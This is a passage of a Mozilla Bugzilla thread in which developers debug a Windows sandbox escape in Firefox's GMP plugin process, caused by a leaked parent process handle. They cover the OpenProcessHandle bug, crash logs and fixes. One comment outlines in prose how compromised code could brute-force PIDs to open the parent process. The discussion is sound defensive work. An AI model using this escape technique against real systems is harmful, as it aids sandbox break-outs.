        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c22">Comment 22</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-06 09:53 PST" data-time="1420566793">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-22">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-22" data-comment-id="9758334">We have a serious problem here that needs to be solved for content processes. The GMP plugin has the same problem, but as luck would have it we don't make use of the parent handle in this child process. With content processes we use the handle for creating transports that are initiated from the child side. We may use it for other things. The parent handle is cached in both the process object and the protocol object and can be accessed from either. It also appears we access it at random times during a run (see <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c13">comment 13</a>), so simply closing it out shortly after init breaks lots of stuff. Also, placing heavier restrictions on the parent handle doesn't solve it - if I remove PROCESS_DUP_HANDLE [1] rights, ipc Open calls start failing due to CreateTransport [2] failures.

GMP is an interest story. We still open and populate the parent handle via nsEmbedFunctions.cpp initialization code [3]. However in Fx36, we upped the security restrictions [4] on the gmp process, which caused base::OpenProcessHandle to fail. Thanks to a bug in chromium src [5], this failure went unnoticed. So currently on Nightly and Aurora we pass NULL to GMPProcessChild constructor [6], and apparently everything still works and all tests pass.

To work around this I think we need to:

- stop opening up that parent handle and pass NULL to GMPProcessChild() for all repos we are concerned about. Fx36 and higher should already be safe, but you wouldn't know it from looking at the code. [This needs to be confirmed.]

- fix that chromium bug so failures in base::OpenProcessHandle show up

- file a new sec bug on fixing this for all child processes the right way. Note, this looks like a pretty serious flaw in our ipc code, I do not know of a work around at this point.

[1] <a rel="nofollow" href="http://mxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/process_util_win.cc#71">http://mxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/process_util_win.cc#71</a>
[2] <a rel="nofollow" href="http://mxr.mozilla.org/mozilla-central/source/ipc/glue/Transport_win.cpp#20">http://mxr.mozilla.org/mozilla-central/source/ipc/glue/Transport_win.cpp#20</a>
[3] <a rel="nofollow" href="http://mxr.mozilla.org/mozilla-central/source/toolkit/xre/nsEmbedFunctions.cpp#456">http://mxr.mozilla.org/mozilla-central/source/toolkit/xre/nsEmbedFunctions.cpp#456</a>
[4] <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Use `SetIntegrityLevel` to set initial GMP process integrity to &quot;low&quot; (in addition to using `SetDelayedIntegrityLevel` to set integrity to &quot;untrusted&quot; later)"
   href="/show_bug.cgi?id=1027902">bug 1027902</a>
[5] OpenProcess returns NULL on failure, but chromium src checks for -1:
<a rel="nofollow" href="http://mxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/process_util_win.cc#69">http://mxr.mozilla.org/mozilla-central/source/ipc/chromium/src/base/process_util_win.cc#69</a>
[6] <a rel="nofollow" href="http://mxr.mozilla.org/mozilla-central/source/toolkit/xre/nsEmbedFunctions.cpp#551">http://mxr.mozilla.org/mozilla-central/source/toolkit/xre/nsEmbedFunctions.cpp#551</a></pre></div><div class="change-set" id="c23"><div class="comment" data-id="9758351" data-no="23"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-23" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-23"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-23" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c23">Comment 23</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-06 09:56 PST" data-time="1420566969">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-23">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8544691"
         class="attachment patch"
         data-id="8544691" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="tmp.txt">
      <meta itemprop="contentSize" content="10659">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8544691">
          <a class="link" href="attachment.cgi?id=8544691&amp;action=diff">
        <span id="att-8544691-description" itemprop="description">debugging patch</span></a>
        — <a href="attachment.cgi?id=8544691&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1117140&attachment=8544691">Splinter Review</a>
      </div>
    </div></div><div class="change-set" id="c24"><div class="comment" data-id="9760403" data-no="24"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-24" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-24"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-24" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c24">Comment 24</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-06 14:56 PST" data-time="1420585019">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-24">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-24" data-comment-id="9760403"><a rel="nofollow" href="https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=52f8f30e8edf">https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=52f8f30e8edf</a>

Fixing base::OpenProcessHandle triggered a number of aborts in test runs related to failed OpenProcessHandle calls in various places in the code base.

I'm going to strip out the changes I've made in XRE_InitChildProcess and just push a test run with the OpenProcessHandle bug fix to confirm. We'll have to sort this out first.</pre></div><div class="change-set" id="c25"><div class="comment" data-id="9760454" data-no="25"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-25" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-25"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-25" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c25">Comment 25</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-06 15:11 PST" data-time="1420585868">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-25">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-25" data-comment-id="9760454">Not as bad as this first looked, most if not all of these MOZ_CRASHES point to:

13:23:58     INFO -  Hit MOZ_CRASH(Failed to open process handle!) at c:\builds\moz2_slave\try-w32-d-00000000000000000000\build\src\ipc\glue\BackgroundImpl.cpp:1676
13:23:58     INFO -  #01: mozilla::dom::ContentChild::AllocPBackgroundChild(IPC::Channel *,unsigned long) [dom/ipc/ContentChild.cpp:999]
13:23:58     INFO -  #02: mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const &amp;) [obj-firefox/ipc/ipdl/PContentChild.cpp:6291]
13:23:58     INFO -  #03: mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const &amp;) [ipc/glue/MessageChannel.cpp:1214]
13:23:58     INFO -  #04: mozilla::ipc::MessageChannel::DispatchMessageW(IPC::Message const &amp;) [ipc/glue/MessageChannel.cpp:1140]
13:23:58     INFO -  #05: mozilla::ipc::MessageChannel::OnMaybeDequeueOne() [ipc/glue/MessageChannel.cpp:1124]
13:23:58     INFO -  #06: MessageLoop::RunTask(Task *) [ipc/chromium/src/base/message_loop.cc:362]
13:23:58     INFO -  #07: MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask const &amp;) [ipc/chromium/src/base/message_loop.cc:372]
13:23:58     INFO -  #08: MessageLoop::DoWork() [ipc/chromium/src/base/message_loop.cc:447]
13:23:58     INFO -  #09: mozilla::ipc::MessagePumpForChildProcess::Run(base::MessagePump::Delegate *) [ipc/glue/MessagePump.cpp:297]
13:23:58     INFO -  #10: MessageLoop::RunInternal() [ipc/chromium/src/base/message_loop.cc:233]
13:23:58     INFO -  #11: MessageLoop::RunHandler() [ipc/chromium/src/base/message_loop.cc:227]
13:23:58     INFO -  #12: MessageLoop::Run() [ipc/chromium/src/base/message_loop.cc:201]
13:23:58     INFO -  #13: nsBaseAppShell::Run() [widget/nsBaseAppShell.cpp:166]
13:23:58     INFO -  #14: nsAppShell::Run() [widget/windows/nsAppShell.cpp:180]
13:23:58     INFO -  #15: XRE_RunAppShell [toolkit/xre/nsEmbedFunctions.cpp:738]
13:23:58     INFO -  #16: mozilla::ipc::MessagePumpForChildProcess::Run(base::MessagePump::Delegate *) [ipc/glue/MessagePump.cpp:272]
13:23:58     INFO -  #17: MessageLoop::RunInternal() [ipc/chromium/src/base/message_loop.cc:233]
13:23:58     INFO -  #18: MessageLoop::RunHandler() [ipc/chromium/src/base/message_loop.cc:227]
13:23:58     INFO -  #19: MessageLoop::Run() [ipc/chromium/src/base/message_loop.cc:201]
13:23:58     INFO -  #20: XRE_InitChildProcess [toolkit/xre/nsEmbedFunctions.cpp:579]
13:23:58     INFO -  #21: content_process_main(int,char * * const) [ipc/contentproc/plugin-container.cpp:212]
13:23:58     INFO -  #22: wmain [toolkit/xre/nsWindowsWMain.cpp:124]
13:23:58     INFO -  #23: __tmainCRTStartup [f:/dd/vctools/crt/crtw32/startup/crt0.c:255]
13:23:58     INFO -  #24: kernel32 + 0x53c45
13:23:58     INFO -  #25: ntdll + 0x637f5
13:23:58     INFO -  #26: ntdll + 0x637c8
13:23:58     INFO -  ###!!! [Parent][MessageChannel] Error: Channel error: cannot send/recv</pre></div><div class="change-set" id="c26"><div class="comment" data-id="9760473" data-no="26"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-26" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-26"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-26" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c26">Comment 26</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-06 15:17 PST" data-time="1420586227">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-26">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-26" data-comment-id="9760473">bent, what's this PBackground thing, and does it need to run in content processes? As far as I can tell, it doesn't appear to be working on Window currently.</pre><div class="activity"><div class="change">Flags: needinfo?(bent.mozilla)</div></div></div><div class="change-set" id="c27"><div class="comment" data-id="9760598" data-no="27"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-27" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_462836" id="a270402_7044"><img src="https://secure.gravatar.com/avatar/0e698ba5145076e93cadb50d6e22edcf?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_462836" id="a270402_7044"><a class="email " href="/user_profile?user_id=462836" > <span class="fna">Jed Davis [:jld] ⟨⏰|UTC-6⟩ ⟦he/him⟧</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-27"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-27" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c27">Comment 27</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-06 15:53 PST" data-time="1420588416">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-27">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-27" data-comment-id="9760598">(In reply to Jim Mathies [:jimm] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c26">comment #26</a>)
<span class="quote">&gt; bent, what's this PBackground thing</span >

I am not bent, but it's for IPC actors that run on non-main threads.

<span class="quote">&gt; and does it need to run in content processes?</span >

My understanding is that it does.

Having browsed the source a bit, I think what's going on here is that each top-level actor has an optional handle to the other process, which it needs on Windows in order to be able to send a file descriptor or shared memory object to it.  Which means we'd need to be able to duplicate them, or change the code so a single handle can be shared (refcounted?), if we're going to create a new top-level actor that needs to send fds/shemems.  (If it doesn't, it at least looks possible to use the three-argument Open() that sets mOtherProcess to kInvalidProcessHandle.)

I can believe that GMP doesn't need mOtherProcess for any actor, because the shmem handling was changed to always create them on the parent side due to interactions with Linux sandboxing (they're backed by temporary files), and I don't think there's any other fd/shmem usage in the protocols?</pre></div><div class="change-set" id="c28"><div class="comment" data-id="9760671" data-no="28"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-28" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-28"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-28" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c28">Comment 28</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-06 16:13 PST" data-time="1420589634">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-28">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-28" data-comment-id="9760671">(In reply to Jed Davis [:jld] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c27">comment #27</a>)
<span class="quote">&gt; (In reply to Jim Mathies [:jimm] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c26">comment #26</a>)
&gt; &gt; bent, what's this PBackground thing
&gt; 
&gt; I am not bent, but it's for IPC actors that run on non-main threads.
&gt; 
&gt; &gt; and does it need to run in content processes?
&gt; 
&gt; My understanding is that it does.
&gt; 
&gt; Having browsed the source a bit, I think what's going on here is that each
&gt; top-level actor has an optional handle to the other process, which it needs
&gt; on Windows in order to be able to send a file descriptor or shared memory
&gt; object to it.  Which means we'd need to be able to duplicate them, or change
&gt; the code so a single handle can be shared (refcounted?), if we're going to
&gt; create a new top-level actor that needs to send fds/shemems.  (If it
&gt; doesn't, it at least looks possible to use the three-argument Open() that
&gt; sets mOtherProcess to kInvalidProcessHandle.)
&gt; 
&gt; I can believe that GMP doesn't need mOtherProcess for any actor, because the
&gt; shmem handling was changed to always create them on the parent side due to
&gt; interactions with Linux sandboxing (they're backed by temporary files), and
&gt; I don't think there's any other fd/shmem usage in the protocols?</span >

Sounds reasonable  since this init code currently fails to duplicate the handle, yet all gmp tests succeed. (I do not know much about the gmp protocols.)

Another twist here, I've run a few of the failing tests locally on Win7, and I can't get them to fail in the same way as try.  I might have jumped the gun a bit on blaming the PBackground code. I'm waiting on my last try push with just the OpenProcessHandle fix to see - 

<a rel="nofollow" href="https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=5fcb4d05fde6">https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=5fcb4d05fde6</a></pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bent.mozilla)</span></div></div></div><div class="change-set" id="c29"><div class="comment" data-id="9760721" data-no="29"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-29" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_200444" id="a270402_7044"><img src="https://secure.gravatar.com/avatar/a1dc08fda91b2717842f4b1903da2881?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_200444" id="a270402_7044"><a class="email " href="/user_profile?user_id=200444" > <span class="fna">Ben Turner (not reading bugmail, use the needinfo flag!)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-29"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-29" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c29">Comment 29</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-06 16:24 PST" data-time="1420590242">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-29">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-29" data-comment-id="9760721">Hm, I have no idea what's going on with those failures...

PBackground is how we do all IndexedDB from both parent and child processes, and we have tons of tests running on windows in both child and parent process right now on tinderbox.

I applied your patch locally and everything continues to work, so I think there's something else going on there.</pre></div><div class="change-set" id="c30"><div class="comment" data-id="9762522" data-no="30"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-30" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_458623" id="a270402_7044"><img src="https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_458623" id="a270402_7044"><a class="email " href="/user_profile?user_id=458623" > <span class="fna">Bob Owen (:bobowen)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-30"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-30" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c30">Comment 30</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 03:04 PST" data-time="1420628657">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-30">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-30" data-comment-id="9762522">(In reply to Jim Mathies [:jimm] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c24">comment #24</a>)
<span class="quote">&gt; <a rel="nofollow" href="https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=52f8f30e8edf">https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=52f8f30e8edf</a>
&gt; 
&gt; Fixing base::OpenProcessHandle triggered a number of aborts in test runs
&gt; related to failed OpenProcessHandle calls in various places in the code base.</span >

Do we need to fix base::OpenProcessHandle to get the quick fix for GMP?</pre></div><div class="change-set" id="c31"><div class="comment" data-id="9762675" data-no="31"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-31" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-31"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-31" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c31">Comment 31</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 04:02 PST" data-time="1420632128">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-31">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-31" data-comment-id="9762675">(In reply to Bob Owen (:bobowen) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c30">comment #30</a>)
<span class="quote">&gt; (In reply to Jim Mathies [:jimm] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - GMP sandbox break-out on Windows through process handle"
   href="/show_bug.cgi?id=1117140#c24">comment #24</a>)
&gt; &gt; <a rel="nofollow" href="https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=52f8f30e8edf">https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=52f8f30e8edf</a>
&gt; &gt; 
&gt; &gt; Fixing base::OpenProcessHandle triggered a number of aborts in test runs
&gt; &gt; related to failed OpenProcessHandle calls in various places in the code base.
&gt; 
&gt; Do we need to fix base::OpenProcessHandle to get the quick fix for GMP?</span >

Maybe not assuming we feel confident these failures are try only, which at this point appears to be the case. If so we can skip the chromium fix for now and just land the handle fix. Posting that to try now to see what shows up.</pre></div><div class="change-set" id="c32"><div class="comment" data-id="9762677" data-no="32"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-32" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-32"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-32" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c32">Comment 32</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 04:02 PST" data-time="1420632144">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-32">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8545201"
         class="attachment patch obsolete"
         data-id="8545201" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="tmp.txt">
      <meta itemprop="contentSize" content="2543">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8545201">
          <a class="link" href="attachment.cgi?id=8545201&amp;action=diff">
        <span id="att-8545201-description" itemprop="description">handle fix</span></a> (obsolete)
        — <a href="attachment.cgi?id=8545201&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1117140&attachment=8545201">Splinter Review</a>
      </div>
    </div></div><div class="change-set" id="c33"><div class="comment" data-id="9762682" data-no="33"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-33" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-33"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-33" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c33">Comment 33</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 04:03 PST" data-time="1420632228">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-33">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-33" data-comment-id="9762682"><a rel="nofollow" href="https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=a136e42901f7">https://treeherder.mozilla.org/ui/#/jobs?repo=try&amp;revision=a136e42901f7</a></pre></div><div class="change-set" id="c34"><div class="comment" data-id="9762816" data-no="34"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-34" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_279663" id="a270402_7044"><img src="extensions/Gravatar/web/default.jpg" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_279663" id="a270402_7044"><a class="email " href="/user_profile?user_id=279663" > <span class="fna">Jim Mathies [:jimm]</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-34"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-34" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1117140#c34">Comment 34</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-01-07 04:44 PST" data-time="1420634646">7 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-34">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-34" data-comment-id="9762816">Taking a step back, I don't think this fix does anything to mitigate this vulnerability. The problem here isn't the duplicated handle, it's the ability for a compromised GMP process to call OpenProcess successfully. If I had code execution in the GMP process, I could iterate PIDs in a call to OpenProcess until I hit on the right one, then from there I can pretty much do anything.

On Nightly, OpenProcess fails thanks to a sandbox upgrade and a restriction tightening (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Update security/sandbox to upstream chromium sandbox code as of 25th July 2014"
   href="/show_bug.cgi?id=1041775">bug 1041775</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Use `SetIntegrityLevel` to set initial GMP process integrity to &quot;low&quot; (in addition to using `SetDelayedIntegrityLevel` to set integrity to &quot;untrusted&quot; later)"
